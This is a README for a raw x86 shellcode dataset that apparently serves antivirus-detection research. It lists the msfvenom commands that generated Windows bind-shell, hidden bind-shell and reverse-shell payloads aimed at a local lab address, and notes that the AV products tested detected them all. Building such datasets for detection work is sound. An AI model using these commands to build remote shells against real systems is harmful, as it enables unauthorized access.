# /data/raw/shellcode/x86

## Provenance

Creator: Oriol Lopez Petit
Version_date: 18 of August 2026
User: orionLP
Comments: As of time of writing, the dataset has been been created with msfvenom, as it is the tool that 
obtained the highest detection rate (datasets in raw are intended to be detected by all AVs tested).

## Testing

All files have been tested to work in a local setup (the setup being a simple client machine and a host machine with an AV installed),
and they have been tested to be detected by all the following AVs: AVAST-FREE, AVG-FREE, KASPERSKY (paid version), NORTON-BULLGUARD (paid version), BITDEFENDER.
 
## Files and their origin

In this folder each file is a raw string of bytes of x86 code. Here is each of the files and the command that created them:

- `windows_shell_bind_hidden_ipknock_tcp.bin`

  ```{bash}
  msfvenom --payload windows/shell/bind_hidden_ipknock_tcp KHOST=10.0.2.15 -f raw -a x86 --platform windows -o windows_shell_bind_hidden_ipknock_tcp.bin
  ```

- `windows_shell_bind_tcp.bin`

  ```{bash}
  msfvenom --payload windows/shell_bind_tcp -f raw -a x86 --platform windows -o windows_shell_bind_tcp.bin
  ```

- `windows_shell_hidden_bind_tcp.bin`

  ```{bash}
  msfvenom --payload windows/shell_hidden_bind_tcp AHOST=10.0.2.15 -f raw -a x86 --platform windows -o windows_shell_hidden_bind_tcp.bin
  ```

- `windows_pingback_bing_tcp.bin`

  ```{bash}
  msfvenom --payload windows/pingback_bind_tcp -f raw -a x86 --platform windows -o windows_pingback_bind_tcp.bin
  ```

- `windows_shell_reverse_tcp_rc4.bin`

  ```{bash}
  msfvenom --payload windows/shell/reverse_tcp_rc4 LHOST=10.0.2.15 -f raw -a x86 --platform windows -o windows_shell_reverse_tcp_rc4.bin
  ```

- `windows_pingback_reverse_tcp.bin`

  ```{bash}
  msfvenom --payload windows/pingback_reverse_tcp LHOST=10.0.2.15 -f raw -a x86 --platform windows -o windows_pingback_reverse_tcp.bin
  ```

- `windows_shell_reverse_tcp.bin`

  ```{bash}
  msfvenom --payload windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f raw -a x86 --platform windows -o windows_shell_reverse_tcp.bin
  ```


